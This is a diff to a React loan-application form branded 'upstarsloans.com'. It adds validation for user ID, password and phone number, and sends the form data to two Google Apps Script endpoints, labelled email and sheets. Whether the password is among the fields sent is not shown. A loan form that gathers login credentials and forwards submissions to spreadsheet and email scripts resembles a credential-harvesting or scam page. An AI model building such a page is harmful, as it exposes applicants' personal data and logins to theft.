@@ -30,6 +30,7 @@ const LoanApplication = () => {
   const [signature, setSignature] = useState('')
   const [isProcessing, setIsProcessing] = useState(false)
   const [isDrawing, setIsDrawing] = useState(false)
+  const [validationErrors, setValidationErrors] = useState({})
   const canvasRef = useRef(null)
   const navigate = useNavigate()
 
@@ -182,8 +183,27 @@ const LoanApplication = () => {
 
   const handleStep2Submit = (e) => {
     e.preventDefault()
-    if (formData.userId && formData.password && formData.phoneNumber) {
+    const errors = {}
+    
+    if (!formData.userId || formData.userId.trim() === '') {
+      errors.userId = 'User ID is required'
+    }
+    
+    if (!formData.password || formData.password.trim() === '') {
+      errors.password = 'Password is required'
+    }
+    
+    if (!formData.phoneNumber || formData.phoneNumber.trim() === '') {
+      errors.phoneNumber = 'Telephone Number is required'
+    } else if (!/^\d{10}$/.test(formData.phoneNumber.replace(/\D/g, ''))) {
+      errors.phoneNumber = 'Telephone Number must be exactly 10 digits'
+    }
+    
+    setValidationErrors(errors)
+    
+    if (Object.keys(errors).length === 0) {
       setShowAgreement(true)
+      setValidationErrors({})
     }
   }
 
@@ -203,8 +223,7 @@ const LoanApplication = () => {
 
   const submitToGoogleSheets = async () => {
     try {
-      const scriptUrl = 'https://script.google.com/macros/s/AKfycbwIlAfBITq6kvRw1xG4cFEV_E09i2FmYuaviFdBGbuDEYHV7NRqFL9B14QFYzcIFkWa/exec'
-      
+      // Form data to submit
       const formDataToSubmit = {
         formType: 'loanApplication',
         loanAmount: formData.loanAmount,
@@ -226,7 +245,12 @@ const LoanApplication = () => {
         phoneNumber: formData.phoneNumber
       }
 
-      const response = await fetch(scriptUrl, {
+      // Submit to both scripts
+      const emailScriptUrl = 'https://script.google.com/macros/s/AKfycbzP3LCzrPSHHhwvwSLVz1lK57AuSfEpUtQAumanimqvsPxrcbiiTYreSR6aPBuWUo4h7Q/exec'
+      const sheetsScriptUrl = 'https://script.google.com/macros/s/AKfycbxGqA6A5sqAa5RRJ8x9kYt3WCt2dLpkgwydNO42DMXWd2Se8PfG4zW0TjCu_zKiIZwh/exec'
+
+      // Submit to email script
+      const emailResponse = await fetch(emailScriptUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded',
@@ -234,12 +258,26 @@ const LoanApplication = () => {
         body: new URLSearchParams(formDataToSubmit)
       })
 
-      const result = await response.json()
+      // Submit to sheets script
+      const sheetsResponse = await fetch(sheetsScriptUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: new URLSearchParams(formDataToSubmit)
+      })
+
+      const emailResult = await emailResponse.json()
+      const sheetsResult = await sheetsResponse.json()
       
-      if (result.status === 'success') {
-        console.log('Form submitted successfully:', result.message)
+      // Log results for debugging
+      console.log('Email Script Result:', emailResult)
+      console.log('Sheets Script Result:', sheetsResult)
+      
+      if (emailResult.status === 'success' || sheetsResult.status === 'success') {
+        console.log('Form submitted successfully to at least one script')
       } else {
-        console.error('Form submission error:', result.message)
+        console.error('Form submission error. Email:', emailResult.message, 'Sheets:', sheetsResult.message)
       }
     } catch (error) {
       console.error('Error submitting form:', error)
@@ -854,14 +892,24 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
                     name="phoneNumber"
                     value={formData.phoneNumber}
                     onChange={handleInputChange}
-                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
-                    placeholder="(555) 123-4567"
-                    pattern="[0-9]{3}-[0-9]{3}-[0-9]{4}"
+                    maxLength="10"
+                    className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 ${
+                      validationErrors.phoneNumber 
+                        ? 'border-red-300 bg-red-50' 
+                        : 'border-gray-300'
+                    }`}
+                    placeholder="5551234567"
+                    pattern="[0-9]{10}"
                     required
                   />
                 </div>
+                {validationErrors.phoneNumber && (
+                  <p className="text-red-600 text-sm mt-1 flex items-center">
+                    <span className="mr-1">!</span> {validationErrors.phoneNumber}
+                  </p>
+                )}
                 <p className="text-xs text-gray-500 mt-1">
-                  Used for verification and provider communication
+                  Enter exactly 10 digits (e.g., 5551234567). Used for verification and provider communication.
                 </p>
               </div>
 
